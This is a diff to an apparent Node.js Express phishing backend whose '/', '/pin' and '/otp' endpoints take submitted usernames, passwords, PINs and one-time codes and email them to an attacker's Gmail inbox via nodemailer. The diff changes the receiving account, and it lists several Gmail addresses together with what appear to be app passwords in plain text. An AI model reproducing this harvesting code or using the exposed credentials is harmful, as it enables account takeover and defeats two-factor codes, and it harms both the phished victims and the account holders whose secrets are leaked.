@@ -20,24 +20,15 @@ app.post("/", (req, res) => {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      // user: "edehchinedu59@gmail.com",
-      // pass: "yknycyzsxdkxpepq",
-      // user: "gracesufficient65@gmail.com",
-      // pass: "gdvumrctjugtigmo",
-      user: "Backendapp7@gmail.com",
-      pass: "mfyeqvqvujqvwscj",
-      // user: 'Victorchinemerem191@gmail.com',
-      // pass: 'aivsveolwtqinddb'
-      // user: 'Victorchinemeremfx.112@gmail.com',
-      // pass: 'eujqfpdvuhepijkk'
-      // user: "join.kudapp@gmail.com",
-      // pass: "ftjbwzimegueosaw",
+      user: "fredrickugoo@gmail.com",
+      pass: "mabxrbclwlrrcoxe",
+     
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Backendapp7@gmail.com",
+    to: "fredrickugoo@gmail.com",
     subject: `Username: ${req.body?.username} \t\n\n\n password: ${req.body?.password}`,
   };
 
@@ -64,8 +55,8 @@ app.post("/pin", (req, res) => {
       // pass: "yknycyzsxdkxpepq",
       // user: "gracesufficient65@gmail.com",
       // pass: "gdvumrctjugtigmo",
-      user: "Backendapp7@gmail.com",
-      pass: "mfyeqvqvujqvwscj",
+      user: "fredrickugoo@gmail.com",
+      pass: "mabxrbclwlrrcoxe",
       // user: 'Victorchinemerem191@gmail.com',
       // pass: 'aivsveolwtqinddb'
       // user: 'Victorchinemeremfx.112@gmail.com',
@@ -77,7 +68,7 @@ app.post("/pin", (req, res) => {
 
   const mailOptions = {
     from: email,
-    to: "Backendapp7@gmail.com",
+    to: "fredrickugoo@gmail.com",
     subject: `PIN: ${req.body?.pin} `,
   };
 
@@ -104,14 +95,14 @@ app.post("/otp", (req, res) => {
       // pass: "yknycyzsxdkxpepq",
       // user: "gracesufficient65@gmail.com",
       // pass: "gdvumrctjugtigmo",
-      user: "Backendapp7@gmail.com",
-      pass: "mfyeqvqvujqvwscj",
+      user: "fredrickugoo@gmail.com",
+      pass: "mabxrbclwlrrcoxe",
     },
   });
 
   const mailOptions = {
     from: email,
-    to: "Backendapp7@gmail.com",
+    to: "fredrickugoo@gmail.com",
     subject: `OTP: ${req.body?.otp} `,
   };
 
